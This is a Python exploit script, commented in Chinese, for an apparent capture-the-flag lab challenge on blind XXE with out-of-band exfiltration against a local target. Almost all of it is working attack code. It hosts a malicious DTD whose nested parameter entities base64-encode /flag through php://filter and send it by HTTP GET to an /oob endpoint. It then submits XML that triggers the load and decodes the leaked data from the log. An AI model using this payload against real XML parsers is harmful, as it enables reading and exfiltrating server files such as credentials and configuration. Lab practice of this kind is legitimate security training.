#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
28-xxe-blind-oob 一键 EXP
目标: http://127.0.0.1:34936
Flag 格式: TOGOGO-flag{...}

思路（盲 XXE + OOB 全闭环）:
  1. POST /dtd-upload  托管 evil.dtd（参数实体三段套）
  2. POST /submit      提交内联 DTD 引用上一步的外部 DTD，触发解析
  3. GET  /oob-log     读取 OOB 日志，拿到 base64 编码的 /flag
  4. base64 解码 -> flag
"""
import re
import sys
import base64
import requests

os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1

TARGET = os.environ.get("GKD_URL") or ("http://127.0.0.1:34936")

# evil.dtd —— 参数实体三段套
#   %f   :  php://filter 把 /flag base64 编码（避免特殊字符破坏 URL/XML）
#   %ex  :  延迟构造一个新实体 %out，URL 里嵌入 %f 的展开结果
#   %out :  真正发起 HTTP GET 把 base64 数据外带到 /oob
#  注: &#x25; 是 '%' 的字符引用，必须延迟解析，否则 parser 当场展开 %out 会报未定义
EVIL_DTD = (
    '<!ENTITY % f SYSTEM "php://filter/convert.base64-encode/resource=/flag">\n'
    '<!ENTITY % ex "<!ENTITY &#x25; out SYSTEM '
    "'http://127.0.0.1/oob?c=%f;'>\">\n"
    '%ex;\n'
    '%out;\n'
)


def step1_upload_dtd(sess: requests.Session) -> str:
    """上传 evil.dtd，拿到靶机内部 URL"""
    r = sess.post(f"{TARGET}/dtd-upload", data=EVIL_DTD,
                  headers={"Content-Type": "text/plain"}, timeout=10)
    print(f"[+] /dtd-upload -> {r.status_code} {r.text}")
    j = r.json()
    assert j.get("ok"), "DTD 上传失败"
    return j["url"]


def step2_trigger(sess: requests.Session, dtd_url: str) -> None:
    """提交 XML 触发外部 DTD 加载 + %out 引用"""
    xml = (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE r [<!ENTITY % dtd SYSTEM "{dtd_url}"> %dtd;]>\n'
        '<r>hi</r>'
    )
    r = sess.post(f"{TARGET}/submit", data=xml,
                  headers={"Content-Type": "application/xml"}, timeout=10)
    # parse failed 是正常的：parser 在 fail 之前已经发出 OOB 请求
    print(f"[+] /submit   -> {r.status_code} {r.text}")


def step3_read_log(sess: requests.Session) -> str:
    """读取 OOB 日志，提取最新一条 c=<base64>"""
    r = sess.get(f"{TARGET}/oob-log", timeout=10)
    print(f"[+] /oob-log  -> {r.status_code}\n{r.text}")
    # 提取所有 c=xxx，取最新的（最后一行通常即本次外带）
    candidates = re.findall(r"QS=c=([A-Za-z0-9+/=_-]+)", r.text)
    assert candidates, "OOB 日志里没找到 base64 数据"
    # 反向遍历，挑能成功解码且看起来像 flag 的
    for tok in reversed(candidates):
        try:
            data = base64.b64decode(tok + "=" * (-len(tok) % 4))
            txt = data.decode(errors="ignore")
            if "flag" in txt.lower():
                return txt.strip()
        except Exception:
            continue
    # 兜底：返回最后一条解码结果
    return base64.b64decode(candidates[-1] + "=" * (-len(candidates[-1]) % 4)) \
        .decode(errors="ignore").strip()


def main() -> int:
    with requests.Session() as sess:
        print(f"[*] Target: {TARGET}")

        # 探针，确认 OOB 通道可达
        sess.get(f"{TARGET}/oob", params={"c": "probe_init"}, timeout=10)

        dtd_url = step1_upload_dtd(sess)
        print(f"[+] evil.dtd hosted at: {dtd_url}")

        step2_trigger(sess, dtd_url)

        flag = step3_read_log(sess)
        print("\n" + "=" * 60)
        print(f"[★] FLAG = {flag}")
        print("=" * 60)
        return 0


if __name__ == "__main__":
    sys.exit(main())
